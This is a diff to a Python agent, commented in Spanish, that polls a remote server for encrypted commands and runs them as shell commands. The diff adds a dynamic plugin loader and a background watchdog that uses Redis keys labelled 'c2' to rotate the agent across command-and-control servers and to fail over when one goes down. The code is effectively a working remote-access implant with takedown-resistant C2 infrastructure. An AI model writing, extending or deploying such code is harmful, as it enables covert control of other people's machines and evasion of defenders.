@@ -72,6 +72,15 @@ current_server_index = 0
 
 def execute_command(command: str) -> str:
     """Ejecuta un comando del sistema y captura su salida."""
+    
+    # Verificar si es un plugin especial
+    if command.startswith("__plugin__"):
+        plugin_call = command[len("__plugin__"):].strip()
+        parts = plugin_call.split(" ", 1)
+        plugin_name = parts[0]
+        plugin_args = parts[1] if len(parts) > 1 else None
+        return run_plugin(plugin_name, plugin_args)
+    
     try:
         result = subprocess.run(
             command,
@@ -86,6 +95,178 @@ def execute_command(command: str) -> str:
         return "(error) comando excedió el tiempo límite"
     except Exception as e:
         return f"(error) {e}"
+
+
+def run_plugin(plugin_name: str, args=None) -> str:
+    """Carga y ejecuta un plugin desde agent/plugins/."""
+    import importlib
+    import sys as _sys
+    
+    try:
+        # Agregar carpeta plugins al path
+        plugins_dir = os.path.join(os.path.dirname(__file__), 'plugins')
+        if plugins_dir not in _sys.path:
+            _sys.path.insert(0, os.path.dirname(__file__))
+            _sys.path.insert(0, plugins_dir)
+        
+        # Importar módulo del plugin
+        module = importlib.import_module(plugin_name)
+        plugin_instance = module.Plugin()
+        return plugin_instance.run(args)
+    
+    except ModuleNotFoundError:
+        return f"[-] Plugin '{plugin_name}' no encontrado en agent/plugins/"
+    except Exception as e:
+        return f"[-] Error ejecutando plugin '{plugin_name}': {str(e)}"
+
+
+# ============================================================
+# WATCHDOG: Alta disponibilidad automática
+# ============================================================
+
+def start_watchdog():
+    """
+    Hilo de watchdog que maneja:
+    1. Failover automático si el servidor actual se cae
+    2. Rotación automática cada N minutos (configurable en Redis)
+    """
+    import threading
+
+    def watchdog_loop():
+        redis_host  = os.getenv("REDIS_HOST", "192.168.1.55")
+        redis_port  = int(os.getenv("REDIS_PORT", 6379))
+        current_srv = os.getenv("CURRENT_SERVER", "")
+
+        # Dar tiempo al agente para conectarse antes de monitorear
+        time.sleep(30)
+
+        while True:
+            try:
+                # Intentar conectar a Redis
+                try:
+                    import redis as redis_lib
+                    r = redis_lib.Redis(
+                        host=redis_host,
+                        port=redis_port,
+                        decode_responses=True,
+                        socket_connect_timeout=3
+                    )
+                    r.ping()
+                except Exception:
+                    # Redis no disponible, no podemos hacer nada
+                    time.sleep(30)
+                    continue
+
+                # ------------------------------------------------
+                # VERIFICAR ROTACIÓN AUTOMÁTICA
+                # ------------------------------------------------
+                auto_on    = r.get("config:auto_rotation") == "1"
+                next_rot   = r.get("c2:next_rotation")
+
+                if auto_on and next_rot:
+                    try:
+                        next_ts = float(next_rot)
+                        if time.time() >= next_ts:
+                            print(f"\n[⏱️] Rotación automática programada")
+                            print("> ", end="", flush=True)
+
+                            # Importar plugin y ejecutar rotación
+                            sys.path.insert(0, os.path.dirname(__file__))
+                            from plugins.rotate_server import (
+                                get_available_servers, get_next_server,
+                                launch_new_agent, log_event
+                            )
+
+                            servers = get_available_servers(r)
+                            target  = get_next_server(r, current_srv, servers)
+
+                            if target and target['name'] != current_srv:
+                                success, msg = launch_new_agent(
+                                    target['url'], redis_host, str(redis_port),
+                                    target['name']
+                                )
+                                if success:
+                                    import json
+                                    log_event(r, "auto_rotation", {
+                                        "from": current_srv,
+                                        "to": target['name']
+                                    })
+                                    r.set("c2:active_server", target['name'])
+                                    r.setex("agent:last_rotation", 600, json.dumps({
+                                        "from": current_srv,
+                                        "to": target['name'],
+                                        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S")
+                                    }))
+                                    print(f"\n[⏱️] Rotado a {target['name']} exitosamente")
+                                    print("> ", end="", flush=True)
+                                    time.sleep(5)
+                                    os._exit(0)
+
+                    except Exception as e:
+                        print(f"\n[!] Error en watchdog rotación: {e}")
+                        print("> ", end="", flush=True)
+
+                # ------------------------------------------------
+                # VERIFICAR SALUD DEL SERVIDOR ACTUAL
+                # ------------------------------------------------
+                if SERVER_URL:
+                    try:
+                        import requests as req
+                        resp = req.get(f"{SERVER_URL}/health", timeout=8)
+                        if resp.status_code != 200:
+                            raise Exception(f"HTTP {resp.status_code}")
+                        # Servidor sano, resetear contador
+                        r.set("c2:agent_status", "healthy")
+
+                    except Exception:
+                        # Servidor caído - intentar failover
+                        print(f"\n[⚠️] Servidor {current_srv} no responde - iniciando failover")
+                        print("> ", end="", flush=True)
+
+                        sys.path.insert(0, os.path.dirname(__file__))
+                        from plugins.rotate_server import (
+                            get_available_servers, launch_new_agent, log_event
+                        )
+
+                        servers = get_available_servers(r)
+                        others  = [s for s in servers if s['name'] != current_srv]
+
+                        if others:
+                            target = others[0]
+                            import json
+                            log_event(r, "failover", {
+                                "failed_server": current_srv,
+                                "new_server": target['name']
+                            })
+
+                            success, msg = launch_new_agent(
+                                target['url'], redis_host, str(redis_port),
+                                target['name']
+                            )
+
+                            if success:
+                                r.set("c2:active_server", target['name'])
+                                print(f"\n[→] Failover exitoso: {current_srv} → {target['name']}")
+                                print("> ", end="", flush=True)
+                                time.sleep(5)
+                                os._exit(0)
+                            else:
+                                print(f"\n[!] Failover fallido: {msg}")
+                                print("> ", end="", flush=True)
+                        else:
+                            print(f"\n[!] No hay servidores alternativos para failover")
+                            print("> ", end="", flush=True)
+
+            except Exception as e:
+                pass  # Watchdog nunca debe crashear
+
+            # Verificar cada 30 segundos
+            time.sleep(30)
+
+    watchdog_thread = threading.Thread(target=watchdog_loop, daemon=True)
+    watchdog_thread.name = "HA-Watchdog"
+    watchdog_thread.start()
+    return watchdog_thread
 
 
 # ============================================
@@ -251,20 +432,20 @@ def poll_command():
     
     if not agent_session_key:
         print("[!] No session key available")
-        return None
+        return "error"  # Error real
     
     try:
         response = requests.post(
             f"{SERVER_URL}/poll",
             json={"agent_id": AGENT_ID},
-            timeout=15  # Aumentado de 10 a 15
+            timeout=15
         )
         response.raise_for_status()
         data = response.json()
         
         encrypted_payload = data.get("payload")
         if not encrypted_payload:
-            return None
+            return None  # Sin payload = sin comandos (respuesta válida)
         
         # Decrypt the payload
         try:
@@ -273,22 +454,22 @@ def poll_command():
             
             # Check if there's an actual command
             if cmd_data.get("command") is not None:
-                return cmd_data
-            return None
+                return cmd_data  # Hay un comando
+            return None  # Sin comandos (respuesta válida)
             
         except Exception as decrypt_error:
             print(f"[!] Error decrypting command: {decrypt_error}")
-            return None
+            return "error"  # Error real
         
     except requests.exceptions.Timeout as e:
-        print(f"[!] Timeout en poll (15s excedidos): {e}")
-        return None
+        print(f"[!] Timeout en poll: {e}")
+        return "error"  # Error real
     except requests.exceptions.ConnectionError as e:
         print(f"[!] Error de conexión en poll: {e}")
-        return None
+        return "error"  # Error real
     except Exception as e:
         print(f"[!] Error en poll: {e}")
-        return None
+        return "error"  # Error real
 
 
 def send_result(msg_id: str, output: str, status: str = "ok"):
@@ -382,6 +563,10 @@ def run_agent():
     print(f"[*] Presiona Ctrl+C para detener")
     print()
     
+    # Iniciar watchdog de alta disponibilidad
+    watchdog = start_watchdog()
+    print(f"[*] Watchdog HA iniciado (failover + rotación automática)")
+    
     # Loop principal
     consecutive_failures = 0
     
@@ -431,7 +616,7 @@ def run_agent():
                 # Preguntar si hay comandos
                 cmd_data = poll_command()
                 
-                if cmd_data and cmd_data.get("type") == "cmd":
+                if cmd_data and cmd_data != "error" and cmd_data.get("type") == "cmd":
                     cmd = cmd_data.get("command")
                     msg_id = cmd_data.get("id")
                     
@@ -447,11 +632,11 @@ def run_agent():
                     else:
                         print(f"[!] Fallo al enviar resultado id={msg_id}")
                         consecutive_failures += 1
-                elif cmd_data is None:
-                    # Error en polling
+                elif cmd_data == "error":
+                    # Error REAL de red/servidor
                     consecutive_failures += 1
                 else:
-                    # No hay comandos, resetear contador
+                    # None = sin comandos pendientes (respuesta válida del servidor)
                     consecutive_failures = 0
                 
                 # Si hay 3 fallos consecutivos, intentar failover
